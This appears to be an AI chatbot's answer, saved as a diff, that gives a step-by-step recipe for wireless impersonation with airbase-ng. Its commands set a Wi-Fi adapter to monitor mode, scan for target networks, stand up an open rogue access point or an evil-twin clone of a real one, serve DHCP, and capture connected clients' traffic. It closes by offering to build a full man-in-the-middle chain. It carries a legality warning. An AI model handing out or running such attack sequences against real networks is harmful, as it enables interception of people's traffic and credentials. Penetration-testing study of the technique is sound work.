@@ -1,0 +1,91 @@
+🔧 Step-by-Step Guide: How to Use Airbase-ng in Kali Linux
+✅ 1. Put Wi-Fi Adapter into Monitor Mode
+bash
+Copy
+Edit
+sudo airmon-ng start wlan0
+Replace wlan0 with your Wi-Fi interface.
+
+Monitor mode interface will be something like wlan0mon.
+
+✅ 2. Choose a Target Channel (Optional)
+Use airodump-ng to scan and choose a target AP or client:
+
+bash
+Copy
+Edit
+sudo airodump-ng wlan0mon
+Note the channel and BSSID of the target if you want to clone a specific network.
+
+🔥 3. Start Airbase-ng to Create a Fake Access Point
+🔸 Example 1: Create Open Rogue AP
+bash
+Copy
+Edit
+sudo airbase-ng -e "Free_WiFi" -c 6 wlan0mon
+-e is the ESSID (name of the fake AP).
+
+-c is the channel (you can change to match a real AP or random).
+
+wlan0mon is your monitor interface.
+
+🔸 Example 2: Clone Real AP (Evil Twin)
+bash
+Copy
+Edit
+sudo airbase-ng -a <target-BSSID> -e "<target-SSID>" -c <channel> wlan0mon
+Replace:
+
+<target-BSSID> with real AP MAC
+
+<target-SSID> with the same SSID
+
+<channel> to match original AP
+
+✅ 4. Set Up Network Configuration (Optional)
+After launching Airbase-ng, a new interface like at0 will appear. You can configure it:
+
+bash
+Copy
+Edit
+sudo ifconfig at0 up
+sudo ifconfig at0 10.0.0.1 netmask 255.255.255.0
+Then set up DHCP and routing (optional, for internet access or captive portal):
+
+bash
+Copy
+Edit
+sudo service isc-dhcp-server start
+Or use dnsmasq, iptables, or hostapd depending on your attack setup.
+
+✅ 5. Monitor and Collect Data
+Clients that connect to your fake AP can be monitored:
+
+bash
+Copy
+Edit
+sudo wireshark
+Or capture traffic with:
+
+bash
+Copy
+Edit
+sudo tcpdump -i at0
+⚠️ Warning
+Using Airbase-ng to impersonate Wi-Fi networks without permission is illegal. Always use it in authorized environments like:
+
+Penetration Testing Labs
+
+CTFs
+
+Client-authorized security audits
+
+📌 Useful Flags Summary
+Option	Description
+-e <SSID>	Set the fake SSID
+-c <channel>	Set the wireless channel
+-a <BSSID>	Clone real AP's MAC address
+-P	Respond to probe requests (for karma)
+-Z	Use WPA encryption simulation (not real)
+
+If you need help building a full MITM attack chain (with Airbase-ng + iptables + dnsmasq or captive portals), let me know!
